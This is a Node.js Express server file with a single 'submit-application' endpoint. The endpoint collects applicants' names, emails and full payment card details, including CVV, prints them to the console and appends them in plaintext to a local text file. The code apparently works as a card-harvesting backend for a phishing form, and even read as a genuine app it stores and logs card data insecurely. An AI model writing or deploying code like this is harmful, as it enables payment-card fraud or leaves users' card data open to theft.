const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Store user data file path
const DATA_FILE = path.join(__dirname, 'User_data.txt');

// API to receive application
app.post('/submit-application', (req, res) => {
    console.log('=== Received submission ===');
    console.log('Request body:', req.body);

    const { name, email, justification, cardName, cardNumber, expiryDate, cvv, city } = req.body;

    // Simple validation
    if (!name || !email || !justification || !cardName || !cardNumber || !expiryDate || !cvv || !city) {
        console.log('Validation failed - missing fields');
        console.log({ name, email, justification, cardName, cardNumber, expiryDate, cvv, city });
        return res.status(400).json({ success: false, message: 'All fields are required.' });
    }

    // Format data to save
    const entry = `
---------------------------------------------------
Date: ${new Date().toISOString()}
Name: ${name}
Email: ${email}
City: ${city}
Why they want to join: ${justification}
Payment Info:
  Card Name: ${cardName}
  Card Number: ${cardNumber}
  Expiry: ${expiryDate}
  CVV: ${cvv}
---------------------------------------------------
`;

    // Append to file
    fs.appendFile(DATA_FILE, entry, (err) => {
        if (err) {
            console.error('Error saving data:', err);
            return res.status(500).json({ success: false, message: 'Internal Server Error' });
        }
        console.log('Data saved successfully!');
        res.json({ success: true, message: 'Application received. We will contact you shortly.' });
    });
});

app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
});
